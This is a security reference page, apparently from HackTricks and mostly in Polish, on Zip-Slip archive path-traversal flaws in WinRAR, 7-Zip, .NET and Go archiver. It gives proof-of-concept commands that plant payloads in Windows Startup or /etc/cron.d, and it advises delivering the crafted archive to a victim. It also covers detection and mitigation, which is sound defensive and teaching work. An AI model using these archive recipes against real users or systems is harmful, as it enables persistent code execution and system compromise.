# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Przegląd

Wiele formatów archiwów (ZIP, RAR, TAR, 7-ZIP, itd.) pozwala, aby każdy wpis niósł własną **wewnętrzną ścieżkę**. Gdy narzędzie do rozpakowywania bezrefleksyjnie respektuje tę ścieżkę, spreparowana nazwa pliku zawierająca `..` lub **ścieżkę bezwzględną** (np. `C:\Windows\System32\`) zostanie zapisana poza katalogiem wybranym przez użytkownika.
Ten rodzaj podatności jest powszechnie znany jako *Zip-Slip* lub **archive extraction path traversal**.

Konsekwencje obejmują nadpisanie dowolnych plików lub bezpośrednie uzyskanie remote code execution (RCE) poprzez upuszczenie payloadu w lokalizacji auto-run, takiej jak katalog *Startup* w Windows.

## Przyczyna

1. Atakujący tworzy archiwum, w którym jeden lub więcej nagłówków plików zawiera:
* Relative traversal sequences (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Absolute paths (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* Or crafted **symlinks** that resolve outside the target dir (common in ZIP/TAR on *nix*).
2. Ofiara rozpakowuje archiwum za pomocą podatnego narzędzia, które ufa osadzonej ścieżce (lub podąża za symlinkami) zamiast jej oczyszczać/normalizować lub wymusić rozpakowanie wewnątrz wybranego katalogu.
3. Plik zostaje zapisany w kontrolowanej przez atakującego lokalizacji i zostaje wykonany/załadowany następnym razem, gdy system lub użytkownik wywoła tę ścieżkę.

### .NET `Path.Combine` + `ZipArchive` traversal

A common .NET anti-pattern is combining the intended destination with **kontrolowanym przez użytkownika** `ZipArchiveEntry.FullName` and extracting without path normalisation:
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- Jeśli `entry.FullName` zaczyna się od `..\\`, spowoduje przejście w górę drzewa katalogów; jeśli jest **ścieżką bezwzględną** składnik po lewej stronie zostaje całkowicie odrzucony, co skutkuje **dowolnym zapisem pliku** z uprawnieniami tożsamości użytej podczas ekstrakcji.
- Proof-of-concept archive do zapisania w sąsiednim katalogu `app` monitorowanym przez zaplanowany skaner:
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
Upuszczenie tego ZIP-a do monitorowanej skrzynki odbiorczej skutkuje pojawieniem się `C:\samples\app\0xdf.txt`, co dowodzi traversal poza `C:\samples\queue\` i umożliwia dalsze prymitywy (np. DLL hijacks).

## Przykład z prawdziwego świata – WinRAR ≤ 7.12 (CVE-2025-8088)

WinRAR for Windows (w tym `rar` / `unrar` CLI, DLL i przenośny kod źródłowy) nie weryfikował nazw plików podczas rozpakowywania.
Złośliwe archiwum RAR zawierające wpis taki jak:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
zakończy się **poza** wybranym katalogiem wyjściowym i w folderze *Autostart* użytkownika. Po zalogowaniu Windows automatycznie uruchamia wszystko, co się tam znajduje, zapewniając *trwałe* RCE.

### Tworzenie archiwum PoC (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Options used:
* `-ep`  – przechowuj ścieżki plików dokładnie tak jak podano (do **nie** usuwać wiodącego `./`).

Dostarcz `evil.rar` ofierze i poinstruj ją, aby rozpakowała go za pomocą podatnej wersji WinRAR.

### Zaobserwowane wykorzystanie w terenie

ESET zgłosił kampanie spear-phishingowe RomCom (Storm-0978/UNC2596), które dołączały archiwa RAR wykorzystujące CVE-2025-8088 w celu wdrażania spersonalizowanych backdoorów i ułatwiania działań ransomware.

## Newer Cases (2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **Błąd**: wpisy ZIP będące **symbolic links** były dereferencjonowane podczas ekstrakcji, pozwalając atakującym wydostać się poza katalog docelowy i nadpisać dowolne ścieżki. Interakcja użytkownika ogranicza się jedynie do *otwarcia/rozpakowania* archiwum.
* **Dotknięte**: 7-Zip 21.02–24.09 (buildy Windows i Linux). Naprawione w **25.00** (lipiec 2025) i później.
* **Ścieżka wpływu**: nadpisanie `Start Menu/Programs/Startup` lub lokalizacji uruchamianych przez usługę → kod wykona się przy następnym logowaniu lub restarcie usługi.
* **Szybki PoC (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
Na załatanym buildzie `/etc/cron.d` nie zostanie naruszony; symlink zostanie rozpakowany jako link wewnątrz /tmp/target.

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **Błąd**: `archiver.Unarchive()` podąża za `../` i wpisami ZIP będącymi symlinkami, zapisując poza `outputDir`.
* **Dotknięte**: `github.com/mholt/archiver` ≤ 3.5.1 (projekt obecnie przestarzały).
* **Poprawka**: Przełącz się na `mholt/archives` ≥ 0.1.0 lub zaimplementuj sprawdzenia ścieżki kanonicznej przed zapisem.
* **Minimalna reprodukcja**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Wskazówki wykrywania

* **Inspekcja statyczna** – Wylistuj wpisy archiwum i oznacz każdą nazwę zawierającą `../`, `..\\`, *ścieżki absolutne* (`/`, `C:`) lub wpisy typu *symlink*, których cel znajduje się poza katalogiem ekstrakcji.
* **Normalizacja kanoniczna** – Upewnij się, że `realpath(join(dest, name))` nadal zaczyna się od `dest`. W przeciwnym razie odrzuć.
* **Ekstrakcja w sandboxie** – Dekompresuj do jednorazowego katalogu używając *bezpiecznego* extractora (np. `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) i zweryfikuj, że powstałe ścieżki pozostają w katalogu.
* **Monitorowanie endpointów** – Alarmuj o nowych plikach wykonywalnych zapisanych do lokalizacji `Startup`/`Run`/`cron` wkrótce po otwarciu archiwum przez WinRAR/7-Zip/itd.

## Łagodzenie i utwardzanie

1. Zaktualizuj extractor – WinRAR 7.13+ i 7-Zip 25.00+ implementują sanityzację ścieżek/symlinków. Oba narzędzia nadal nie mają autoaktualizacji.
2. Rozpakowuj archiwa z opcją “**Do not extract paths**” / “**Ignore paths**”, gdy to możliwe.
3. Na Unixie obniż uprawnienia i zamontuj **chroot/namespace** przed ekstrakcją; na Windows użyj **AppContainer** lub sandboxu.
4. Jeśli piszesz własny kod, znormalizuj ścieżki za pomocą `realpath()`/`PathCanonicalize()` **przed** utworzeniem/zapisem i odrzuć każdy wpis, który wydostaje się poza katalog docelowy.

## Dodatkowe dotknięte / historyczne przypadki

* 2018 – Obszerny advisory *Zip-Slip* od Snyk wpływający na wiele bibliotek Java/Go/JS.
* 2023 – 7-Zip CVE-2023-4011, podobny traversal podczas `-ao` merge.
* 2025 – HashiCorp `go-slug` (CVE-2025-0377) traversal podczas ekstrakcji TAR w slugach (łatka w v1.2).
* Każda niestandardowa logika ekstrakcji, która nie wywołuje `PathCanonicalize` / `realpath` przed zapisem.

## References

- [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

{{#include ../banners/hacktricks-training.md}}
